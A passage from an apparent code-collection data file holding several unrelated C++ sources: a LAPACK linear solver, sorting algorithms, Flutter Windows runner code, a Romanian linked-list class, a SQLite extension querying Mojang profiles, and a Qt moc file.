FACTORIZATION\n    extern int dgetrf_(unsigned int *, unsigned int *, double *, unsigned int *, int *, int *);\n}\n\nextern \"C\" { // SOLVING LINEAR SYSTEM\n    extern int dgetrs_(char *, unsigned int *, unsigned int *, double *, unsigned int *, int *, double *, unsigned int *, int *);\n}\n\nextern \"C\" { // SWAP COLUMNS\n    extern int dswap_(unsigned int *, double *, int *, double *, int *);\n}\n\n\ndouble * fill_in_x(unsigned int n, unsigned int s)\n{\n    double * x = new double[n * s];\n    for(int i = 0; i < n * s; i++) x[i] = 0;\n\n    return x;\n}\n\ndouble * fill_in_b(unsigned int n, unsigned int s)\n{\n    double * b = new double [n * s];\n    for (int i = 0; i < n; ++i){\n        for(int j = 0; j < s; ++j) {\n            b[j * n + i] = (j + i) % n + 1;\n        }\n    }\n    return b;\n}\n\ndouble * fill_in_A(unsigned int n)\n{\n    double * A = new double [n * n];\n    for (int i = 0; i < n; ++i) {\n        A[i * n + i] = 4;\n        if (i + 1 < n) {\n            A[i * n + i + 1] = -1;\n            A[(i + 1) * n + i] = -1;\n        }\n    }\n    return A;\n}\n\n\nvoid print_matrix(double * ary, unsigned int n, unsigned int s, int dist = 15) \n{\n    std::cout << std::endl << std::setw(dist);\n    for(int i = 0; i < n; i++) {\n        \n        for(int j = 0; j < s; j++) {\n            std::cout  << ary[j * n + i] << std::setw(dist);\n        }\n        std::cout << std::endl;\n    }\n    std::cout << std::endl;\n}\n\n\nunsigned int orth(double * p, double * q, double * r, unsigned int n, unsigned int s, double eps)\n{\n/*\nHOW FUNCTION WORKS:\n1) P = QR (QR decomposition for matrix P)\n2) R = Q1 * R1 * P1 (QR decomposition with pivoting for matrix R, P1 is the permutation matrix)\n3) Searching index of element in main diagonal of matrix R1, which less than eps. Let that index is equal cur_rank\n4) Result matrix is equal to product of matrixes: P = Q * Q2, where matrix Q2 contains first cur_rank columns of matrix Q1\n*/\n\n    for(int i = 0; i < s * s; i++) {\n        r[i] = 0;\n    }\n\n    int inc = 1;\n    unsigned int size = n * s;\n    dcopy_(&size, p, &inc, q, &inc);\n\n\n    int lwork = 3 * n + 1;\n    double * work = new double[3 * n + 1];\n    double * tau = new double [n];\n    int info = 1;\n\n    dgeqrf_(&n, &s, q, &n, tau, work, &lwork, &info);   // P = QR\n\n    // filling R\n    for(int i = 0; i < s; i++) {                         \n        for(int j = i; j < s; j++) {\n            r[j * s + i] = q[j * n + i];\n        }\n    }\n    \n    dorgqr_(&n, &s, &s, q, &n, tau, work, &lwork, &info); // compute Q for P = QR\n\n    int * jpvt = new int[s];\n    dgeqp3_(&s, &s, r, &s, jpvt, tau, work, &lwork, &info); // pivoting QR for R\n\n    unsigned int cur_rank = s;\n    for(int i = 0 ; i < s; ++i) {\n        if (std::abs(r[i * s + i]) < eps) {\n            cur_rank = i;\n            break;\n        }\n    }\n    if (cur_rank == 0) {\n        return 0;\n    }\n\n    dorgqr_(&s, &s, &s, r, &s, tau, work, &lwork, &info); // compute Q in R = QR\n\n    char trans = 'N'; double alph = 1.0; double bet = 0.0;\n    dgemm_(&trans, &trans, &n, &cur_rank, &s, &alph, q, &n, r, &s, &bet, p, &n);\n    return cur_rank;\n    \n}\n\n\ndouble cheb_norm(double * r, int col, unsigned int n)\n{\n    double max = 0.0;\n    for(int i = 0; i < n; ++i) {\n        if(std::abs(r[col * n + i]) > max) max = std::abs(r[col * n + i]);\n    }\n    return max;\n}\n\nvoid swap_cols(double * x, double * r, int i, unsigned int j, int * swaps, unsigned int n, unsigned int s)\n{\n// Swapping i-th and j-th columns of matrixes X and R\n    int inc = 1;\n    dswap_(&n, &r[i * n], &inc, &r[j * n], &inc);\n    dswap_(&n, &x[i * n], &inc, &x[j * n], &inc);\n    if(j != 0) {\n        unsigned int t = swaps[i];\n        swaps[i] = swaps[j];\n        swaps[j] = t;\n    }\n\n}\n\nvoid swap_back(double * x, int * swaps, unsigned int n, unsigned int s)\n{\n// swaps: (example)\n// [3 1 4 2] -> [4 1 3 2] -> [2 1 3 4] -> [1 2 3 4]\n    int inc = 1;\n    for(unsigned int i = 1; i <= s; ++i) {\n        if(swaps[i - 1] != i - 1) {\n            dswap_(&n, &x[(i - 1) * n], &inc, &x[swaps[i -",
    "#include <bits/stdc++.h>\r\n#define MAXSIZE 10\r\nusing namespace std;\r\n\r\nvoid iniArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = rand() % 20;\r\n\t}\r\n}\r\n\r\nvoid showArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tcout << arr[i] << \" \";\r\n\t}\r\n\tcout << endl << \"------------\";\r\n}\r\n\r\n//\u5192\u6ce1\u6392\u5e8f\r\nvoid bubSort(int arr[], int length) {\r\n\twhile (length--)\r\n\t{\r\n\t\tfor (int i = 0; i < length; i++) {\r\n\t\t\tif (arr[i + 1] < arr[i]) {\r\n\t\t\t\tint temp = arr[i + 1];\r\n\t\t\t\tarr[i + 1] = arr[i];\r\n\t\t\t\tarr[i] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//\u9009\u62e9\u6392\u5e8f\r\nvoid selectSort(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tint k = i;\r\n\t\tfor (int j = i + 1; j < length; j++) {\r\n\t\t\tif (arr[j] < arr[k]) {\r\n\t\t\t\tk = j;\r\n\t\t\t}\r\n\t\t}\r\n\t\tint temp = arr[i];\r\n\t\tarr[i] = arr[k];\r\n\t\tarr[k] = temp;\r\n\r\n\t}\r\n}\r\n\r\n\r\n//\u63d2\u5165\u6392\u5e8f\r\nvoid insertSort(int arr[], int length) {\r\n\tfor (int i = 1; i < length; i++) {\r\n\t\tint key = arr[i];\r\n\t\tint j = i - 1;\r\n\r\n\t\t// \u5c06\u5143\u7d20arr[i]\u63d2\u5165\u5230\u5df2\u6392\u5e8f\u7684\u5e8f\u5217arr[0..i-1]\u4e2d  \r\n\t\twhile (j >= 0 && arr[j] > key) {\r\n\t\t\tarr[j + 1] = arr[j];\r\n\t\t\tj--;\r\n\t\t}\r\n\t\tarr[j + 1] = key;\r\n\t}\r\n}\r\n\r\n//\u63d2\u5165\u65b0\u7684\u5143\u7d20\r\nvoid insertElement(int arr[], int length, int newElement) {\r\n\tint i;\r\n\tfor (i = length - 1; (i >= 0 && arr[i] > newElement); i--) {\r\n\t\tarr[i + 1] = arr[i]; // \u5c06\u5143\u7d20\u5411\u540e\u79fb\u52a8  \r\n\t}\r\n\tarr[i + 1] = newElement; // \u63d2\u5165\u65b0\u5143\u7d20  \r\n\r\n\t// \u6ce8\u610f\uff1a\u7531\u4e8e\u6570\u7ec4\u5927\u5c0f\u56fa\u5b9a\uff0c\u8fd9\u91cc\u7684\u201c\u63d2\u5165\u201d\u5b9e\u9645\u4e0a\u662f\u8986\u76d6\u4e86\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002  \r\n\t// \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u91cd\u65b0\u5206\u914d\u6570\u7ec4\u7684\u5927\u5c0f\u6765\u771f\u6b63\u63d2\u5165\u4e00\u4e2a\u65b0\u5143\u7d20\u3002  \r\n}\r\n\r\n//\u5e0c\u5c14\u6392\u5e8f\r\nvoid shellSort(int arr[], int length) {\r\n\tint h = 1;\r\n\tint t = length / 3;\r\n\twhile (h<t)\r\n\t{\r\n\t\th = 3 * h - 1;\r\n\t}\r\n\twhile (h >= 1) {\r\n\t\tfor (int i = h; i < length; i++) {\r\n\t\t\tfor (int j = i; j >= h && arr[j] < arr[j - h]; j--) {\r\n\t\t\t\tint temp = arr[j];\r\n\t\t\t\tarr[j] = arr[j - h];\r\n\t\t\t\tarr[j - h] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t\th /= 3;\r\n\t}\r\n}\r\n\r\n//\u5feb\u901f\u6392\u5e8f\r\nvoid quickSort(int arr[], int left, int right) {\r\n\tif (left >= right) {\r\n\t\treturn;\r\n\t}\r\n\tint i = left;\r\n\tint j = right;\r\n\tint pivot = arr[i];\r\n\twhile (i < j)\r\n\t{\r\n\t\twhile (i < j && arr[j] >= pivot)\r\n\t\t\tj--;\r\n\t\t\tarr[i] = arr[j];\r\n\t\twhile (i < j && arr[i] <= pivot)\r\n\t\t\t\t\ti++;\r\n\t\t\tarr[j] = arr[i];\r\n\t}\r\n\t//\u5f53j=i\u65f6\uff0c\u8f74\u786e\u5b9a\r\n\tarr[i] = pivot;\r\n\tquickSort(arr, left, i - 1);\r\n\tquickSort(arr, i + 1, right);\r\n}\r\n\r\n//\u5f52\u5e76\u6392\u5e8f\r\n//\u9ed8\u8ba4\u5e8f\u5217a\u4e0e\u5e8f\u5217b\u90fd\u662f\u6709\u5e8f\u5e8f\u5217\r\nvoid mergesort1(int aArr[], int alen, int bArr[], int blen, int* temp) {\r\n\tint i = 0;\r\n\tint j = 0;\r\n\tint k = 0;\r\n\twhile (i < alen && j < blen)\r\n\t{\r\n\t\t//\u4f7f\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26\u4f7f\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\r\n\t\ttemp[k++] = aArr[i] < bArr[j] ? aArr[i++] : bArr[j++];\r\n\t}\r\n\twhile (i < alen)\r\n\t{\r\n\t\ttemp[k++] = aArr[i++];\r\n\t}\r\n\twhile (j < blen)\r\n\t{\r\n\t\ttemp[k++] = bArr[j++];\r\n\t}\r\n}\r\n\r\n//\u65e0\u5e8f\u5e8f\u5217\uff0c\u5c06\u5176\u62c6\u5206\u5f00\uff0c\u8ba9\u5176\u6210\u4e3a\u6709\u5e8f\u7684\u591a\u4e2a\u5e8f\u5217\r\nvoid merge(int arr[], int low, int mid, int higth, int* temp) {\r\n\tint i = low;\r\n\tint j = mid + 1;\r\n\tint k = low;\r\n\twhile (i <= mid && j <= higth)\r\n\t{\r\n\t\ttemp[k++] = arr[i] < arr[j] ? arr[i++] : arr[j++];\r\n\t}\r\n\twhile (i <= mid) {\r\n\t\ttemp[k++] = arr[i++];\r\n\t}\r\n\twhile (j <= higth) {\r\n\t\ttemp[k++] = arr[j++];\r\n\t}\r\n\tfor (i = low; i <= higth; i++) {\r\n\t\tarr[i] = temp[i];\r\n\t}\r\n}\r\n\r\nvoid merge_sort(int arr[], int low, int higth, int* temp) {\r\n\tif (low >= higth) {\r\n\t\treturn;\r\n\t}\r\n\tint mid = low + (higth - low) / 2;//(low+higth)/2;\r\n\tmerge_sort(arr, low, mid, temp);\r\n\tmerge_sort(arr, mid + 1, higth, temp);\r\n\tmerge(arr, low, mid, higth, temp);\r\n}\r\n\r\nvoid mergesort2(int arr[], int length) {\r\n\tint* temp = new int[length];\r\n\tassert(temp);\r\n\tmerge_sort(arr, 0, length - 1, temp);\r\n\tdelete[] temp;\r\n}\r\n\r\n//\u5165\u5806\uff08\u5185\u5806\uff09\r\nvoid pushHeap(int* heap, int& size, int data) {\r\n\theap[size] = data;\r\n\tint current = size;\r\n\tint parent = (current - 1) / 2;\r\n\twhile (current > 0 && heap[current] < heap[parent]) {\r\n\t\tswap(heap[current], heap[parent]);\r\n\t\tcurrent = parent;\r\n\t\tparent = (current - 1) / 2;\r\n\t}\r\n\tsize++;\r\n}\r\n\r\n//\u51fa\u5806\uff08\u5185\u5806\uff09\r\nint popHeap(int* heap, int& size) {\r\n\tint val = heap[0];\r\n\theap[0] = heap[size - 1];\r\n\tsize--;\r\n\tint current = 0;\r\n\tint child = 2 * current + 1;\r\n\twhile (child < size) {\r\n\t\tif (child + 1 < size && heap[child + 1] < heap[child])\r\n\t\t\tchild++;\r\n\t\tif (heap[child] >= heap[current])\r\n\t\t\tbreak;\r\n\t\tswap(heap[child], heap[current]);\r\n\t\tcurrent = child;\r\n\t\tchild = 2 * current + 1;\r\n\t}\r\n\treturn val;\r\n}\r\n\r\n//\u5806\u6392\u5e8f\u5b9e\u73b0\uff08\u5185\u5806\uff09\r\nvoid heapsort1(int* arr, int length) {\r\n\tint* heap = new int[length];\r\n\tint heapSize = 0;\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tpushHeap(heap, heapSize, arr[i]);\r\n\t}\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = popHeap(heap, heapSize);\r\n\t}\r\n\tdelete[] heap;\r\n}\r\n\r\n// \u8c03\u6574\u5806\uff08\u5916\u5806\uff09\r\nvoid heapify(int arr[], int n, int i) {\r\n\tint largest = i;  // \u521d\u59cb\u5316\u6700\u5927\u5143\u7d20\u4e3a\u6839\u8282\u70b9\r\n\tint left = 2 * i + 1;  // \u5de6\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\tint right = 2 * i + 2;  // \u53f3\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\r\n\t// \u5982\u679c\u5de6\u5b50\u8282\u70b9\u5927\u4e8e\u6839\u8282\u70b9\r\n\tif (left < n && arr[left] > arr[largest]) {\r\n\t\tlargest = left;\r\n\t}\r\n\r\n\t// \u5982\u679c\u53f3\u5b50\u8282\u70b9\u5927\u4e8e\u5f53\u524d\u6700\u5927\u8282\u70b9\r\n\tif (right < n && arr[right] > arr[largest]) {\r\n\t\tlargest = right;\r\n\t}\r\n\r\n\t// \u5982\u679c\u6700\u5927\u8282\u70b9\u4e0d\u662f\u6839\u8282\u70b9\r\n\tif (largest != i) {\r\n\t\tswap(arr[i], arr[largest]);\r\n\t\t// \u9012\u5f52\u8c03\u6574\u5b50\u6811\r\n\t\theapify(arr, n, largest);\r\n\t}\r\n}\r\n\r\n// \u5806\u6392\u5e8f\uff08\u5916\u5806\uff09\r\nvoid heapSort(int arr[], int n) {\r\n\t// \u6784\u5efa\u6700\u5927\u5806\uff08\u4ece\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u5f00\u59cb\uff09\r\n\tfor (int i = n / 2 - 1; i >= 0; i--) {\r\n\t\theapify(arr, n, i);\r\n\t}\r\n\r\n\t// \u9010\u4e2a\u4ece\u5806\u9876\u53d6\u51fa\u5143\u7d20\uff0c\u653e\u5230\u5df2\u6392\u5e8f\u533a\u95f4\u672b\u5c3e\r\n\tfor (int i = n - 1; i > ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"whatisflutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\r\n#include <exception>\r\n\r\n#include \"IteratorLP.h\"\r\n#include \"Lista.h\"\r\n\r\n#include <iostream>\r\n\r\n//complexitate O(capacitate)\r\nLista::Lista() {\r\n\t/* de adaugat */\r\n\tsize = 0;\r\n\tprimul = -1;\r\n\tfor (int i = 0; i < capacitate; i++)\r\n\t{\r\n\t\turmator[i] = i + 1;\r\n\t\turmator[capacitate - 1] = -1;\r\n\t}\r\n\tprimLiber = 0;\r\n}\r\n\r\n//complexitate teta(1)\r\nint Lista::alocare() {\r\n\tint i = primLiber;\r\n\tprimLiber = urmator[primLiber];\r\n\treturn i;\r\n}\r\n\r\n//complexitate teta(1)\r\nvoid Lista::dealocare(int i) {\r\n\turmator[i] = -1;\r\n\telemente[i] = 0;\r\n\tprimLiber = i;\r\n}\r\n\r\n//complexitate O(capacitate)\r\nvoid Lista::redimensionare()\r\n{\r\n\tcapacitate = capacitate * 2;\r\n\tTElem* elemente_noi = new TElem[capacitate];\r\n\tTElem* urmator_nou = new TElem[capacitate];\r\n\tfor (int i = 0; i < size; i++)\r\n\t{\r\n\t\telemente_noi[i] = elemente[i];\r\n\t\turmator_nou[i] = urmator[i];\r\n\t}\r\n\tfor (int i = size; i < capacitate; i++)\r\n\t{\r\n\t\turmator_nou[i] = i + 1;\r\n\t}\r\n\turmator_nou[capacitate - 1] = -1;\r\n\tdelete[] elemente;\r\n\tdelete[] urmator;\r\n\telemente = elemente_noi;\r\n\turmator = urmator_nou;\r\n\tprimLiber = size;\r\n}\r\n\r\n//complexitate teta(1)\r\nint Lista::creare_nod(TElem e) {\r\n\tint i = alocare();\r\n\tif (i != -1)\r\n\t{\r\n\t\tthis->elemente[i] = e;\r\n\t\turmator[i] = -1;\r\n\t}\r\n\treturn i;\r\n}\r\n\r\n//complexitate teta(1)\r\nint Lista::dim() const {\r\n\t/* de adaugat */\r\n\treturn size;\r\n}\r\n\r\n//complexitate teta(1)\r\nbool Lista::vida() const {\r\n\t/* de adaugat */\r\n\tif (dim()==0)\r\n\t\treturn true;\r\n\telse\r\n\t\treturn false;\r\n}\r\n\r\n//complexitate teta(1)\r\nIteratorLP Lista::prim() const {\r\n\t/* de adaugat */\r\n    return IteratorLP(*this);\r\n}\r\n\r\n\r\n//complexitate teta(1)\r\nTElem Lista::element(IteratorLP poz) const {\r\n\t/* de adaugat */\r\n\treturn poz.element();\r\n}\r\n\r\n//complexitate teta(1)\r\nTElem Lista::sterge(IteratorLP& poz) {\r\n\t/* de adaugat */\r\n\r\n\tTElem de_retunrat = poz.element();\r\n\tif (poz.valid() == false)\r\n\t\tthrow std::exception();\r\n\r\n\tint pozitie = poz.curent;\r\n\tint anterior = -1;\r\n\tint current = primul;\r\n\r\n\twhile (current != pozitie) {\r\n\t\tanterior = current;\r\n\t\tcurrent = urmator[current];\r\n\t}\r\n\r\n\tif (anterior == -1) {\r\n\t\tprimul = urmator[current];\r\n\t}\r\n\telse {\r\n\t\turmator[anterior] = urmator[current];\r\n\t}\r\n\r\n\tdealocare(current);\r\n\tsize--;\r\n\r\n\treturn de_retunrat;\r\n}\r\n\r\n//complexitate O(capacitate)\r\nIteratorLP Lista::cauta(TElem e) const{\r\n\t/* de adaugat */\r\n\tIteratorLP it = this->prim();\r\n\twhile (it.valid())\r\n\t{\r\n\t\tif (it.element() == e)\r\n\t\t\treturn it;\r\n\t\tit.urmator();\r\n\t}\r\n\treturn it;\r\n}\r\n\r\n//complexitate teta(1)\r\nTElem Lista::modifica(IteratorLP poz, TElem e) {\r\n\t/* de adaugat */\r\n\tTElem vechi = poz.element();\r\n\tthis->elemente[poz.curent] = e;\r\n\treturn vechi;\r\n}\r\n\r\n//complexitate teta(1)\r\nvoid Lista::adauga(IteratorLP& poz, TElem e) {\r\n\t/* de adaugat */\r\n\tif (poz.valid() == false)\r\n\t\tthrow std::exception();\r\n\tint i = creare_nod(e);\r\n\tif (i != -1)\r\n\t{\r\n\t\turmator[i] = urmator[poz.curent];\r\n\t\turmator[poz.curent] = i;\r\n\t\tpoz.urmator();\r\n\t}\r\n\telse\r\n\t{\r\n\t\tredimensionare();\r\n\t\tint i = creare_nod(e);\r\n\t\turmator[i] = urmator[poz.curent];\r\n\t\turmator[poz.curent] = i;\r\n\t\tpoz.urmator();\r\n\t}\r\n}\r\n\r\n//complexitate teta(1)\r\nvoid Lista::adaugaInceput(TElem e) {\r\n\t/* de adaugat */\r\n\tint i = creare_nod(e);\r\n\tif (i != -1)\r\n\t{\r\n\t\turmator[i] = primul;\r\n\t\tprimul = i;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tredimensionare();\r\n\t\tint i = creare_nod(e);\r\n\t\turmator[i] = primul;\r\n\t\tprimul = i;\r\n\t}\r\n\tsize++;\r\n}\r\n\r\n//complexitate O(N) amortizat\r\nvoid Lista::adaugaSfarsit(TElem e) {\r\n\t/* de adaugat */\r\n\tint i = creare_nod(e);\r\n\tif (i != -1) {\r\n\t\tif (primul == -1) {\r\n\t\t\tprimul = i;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tint current = primul;\r\n\t\t\twhile (urmator[current] != -1) {\r\n\t\t\t\tcurrent = urmator[current];\r\n\t\t\t}\r\n\t\t\turmator[current] = i;\r\n\t\t}\r\n\t\turmator[i] = -1;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tredimensionare();\r\n\t\tint i = creare_nod(e);\r\n\t\tif (primul == -1) {\r\n\t\t\tprimul = i;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tint current = primul;\r\n\t\t\twhile (urmator[current] != -1) {\r\n\t\t\t\tcurrent = urmator[current];\r\n\t\t\t}\r\n\t\t\turmator[current] = i;\r\n\t\t}\r\n\t\turmator[i] = -1;\r\n\t}\r\n\tsize++;\r\n}\r\n\r\n//complexitate O(N) amortizat\r\nint Lista::eliminaToate(Lista& l)\r\n{\r\n\tint contor = 0;\r\n\tIteratorLP it = l.prim();\r\n\twhile (it.valid())\r\n\t{\r\n\t\tif (this->cauta(it.element()).valid())\r\n\t\t{\r\n\t\t\tIteratorLP de_sters = this->cauta(it.element());\r\n\t\t\tthis->sterge(de_sters);\r\n\t\t\tcontor++;\r\n\t\t}\r\n\t\tit.urmator();\r\n\t}\r\n\treturn contor;\r\n}\r\n\r\n\r\nLista::~Lista() {\r\n\t/* de adaugat */\r\n\tdelete[] elemente;\r\n\tdelete[] urmator;\r\n\r\n}\r\n",
    "#include <cstdio>\n#include <cassert>\n#include <cstdint>\n#include <chrono>\n#include <cstring>\n#include <string_view>\n\n#include <curl/curl.h>\n#include <json-c/json.h>\n\n#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */\nSQLITE_EXTENSION_INIT1\n\nbool isValidHexChar(char c) {\n    return ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'));\n}\n\nstd::optional<std::string> normalize_uuid(std::string_view uuid) {\n    std::string out;\n    out.reserve(36);\n    int hyphens = 0;\n    int hex_chars = 0;\n    for (char c : uuid) {\n        if (c == '-') {\n            hyphens++;\n            if (hyphens > 4) return {}; // Too many hyphens\n        }\n        else if (isValidHexChar(c)) {\n            hex_chars++;\n            if (hex_chars > 32) return {}; // Too many hex chars\n            out.push_back(tolower(c));\n            if (hex_chars == 8 || hex_chars == 12 || hex_chars == 16 || hex_chars == 20) {\n                out.push_back('-');\n            }\n        } else {\n            return {}; // invalid uuid\n        }\n    }\n    if (hex_chars < 32) return {};\n    return out;\n}\n\nstruct Profile {\n    std::string uuid;\n    std::string name;\n};\n\nstd::optional<Profile> parse_profile(const char* json_str) {\n    json_object *json = json_tokener_parse(json_str);\n    json_object *name_obj{};\n    json_object *id_obj{};\n    if (json_object_object_get_ex(json, \"name\", &name_obj) && json_object_object_get_ex(json, \"id\", &id_obj)) {\n        // if not valid uuid this throws exception\n        auto normal_uuid = normalize_uuid(json_object_get_string(id_obj)).value();\n        return {Profile{\n            .uuid = std::move(normal_uuid),\n            .name = json_object_get_string(name_obj),\n        }};\n    }\n    return {};\n}\n\nsize_t write_callback(char* data, size_t size, size_t nmemb, std::string* str) {\n    str->append(data, size * nmemb);\n    return size * nmemb;\n}\n\nstd::optional<Profile> fetch_profile(const char* url, std::string* error_out) {\n    CURL *curl = curl_easy_init();\n    assert(curl);\n    curl_easy_setopt(curl, CURLOPT_URL, url);\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);\n    std::string response;\n    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);\n    char error[CURL_ERROR_SIZE];\n    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, &error);\n    CURLcode res = curl_easy_perform(curl);\n    long http_code;\n    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);\n    if (res != CURLE_OK) {\n        *error_out = error;\n        return {};\n    } else if (http_code == 200) {\n        return parse_profile(response.c_str());\n    } else {\n        *error_out = \"Mojang API returned http code \" + std::to_string(http_code);\n        return {};\n    }\n}\n\nstd::optional<Profile> fetch_profile_by_uuid(const char* uuid, std::string* error) {\n    std::string url = std::string{\"https://sessionserver.mojang.com/session/minecraft/profile/\"} + uuid;\n    return fetch_profile(url.c_str(), error);\n}\n\nstd::optional<Profile> fetch_profile_by_name(const char* name, std::string* error) {\n    std::string url = std::string{\"https://api.mojang.com/users/profiles/minecraft/\"} + name;\n    return fetch_profile(url.c_str(), error);\n}\n\nvoid update_cache(sqlite3* db, const char* uuid, const char* name, int64_t created_at) {\n    const char *sql = \"INSERT OR REPLACE INTO mc_profile_cache(uuid, name, created_at) VALUES(?, ?, ?)\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, uuid, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_text(stmt, 2, name, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_int64(stmt, 3, created_at);\n    sqlite3_step(stmt);\n    sqlite3_finalize(stmt);\n}\n\nvoid lookup0(sqlite3_context* ctx, const char* argument, bool uuid) {\n    sqlite3* db = sqlite3_context_db_handle(ctx);\n\n    auto fetch = uuid ? fetch_profile_by_uuid : fetch_profile_by_name;\n    const char *sql = uuid ?\n            \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE uuid = ?\"\n            : \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE name = ?\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, argument, -1, SQLITE_TRANSIENT);\n\n    int64_t now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();\n    constexpr int64_t millis_in_hour = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::hours{1}).count();\n    // Execute SQL statement\n    int err = sqlite3_step(stmt);\n    if (err == SQLITE_ROW) {\n        auto cached_name = (const char*) sqlite3_column_text(stmt, 0);\n        auto cached_uuid = (const char*) sqlite3_column_text(stmt, 1);\n        auto cached_result = uuid ? cached_name : cached_uuid;\n        int64_t created_at = sqlite3_column_int64(stmt, 2);\n        if (now - created_at < millis_in_hour) {\n            sqlite3_result_text(ctx, cached_result, strlen(cached_result), SQLITE_TRANSIENT);\n        } else {\n            std::string erro",
    "/****************************************************************************\n** Meta object code from reading C++ file 'kiemtra.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.2.4)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../../../../IC Tester/IC_Tester/include/kiemtra.h\"\n#include <QtGui/qtextcursor.h>\n#include <QScreen>\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'kiemtra.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.2.4. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_KiemTra_t {\n    const uint offsetsAndSize[8];\n    char stringdata0[34];\n};\n#define 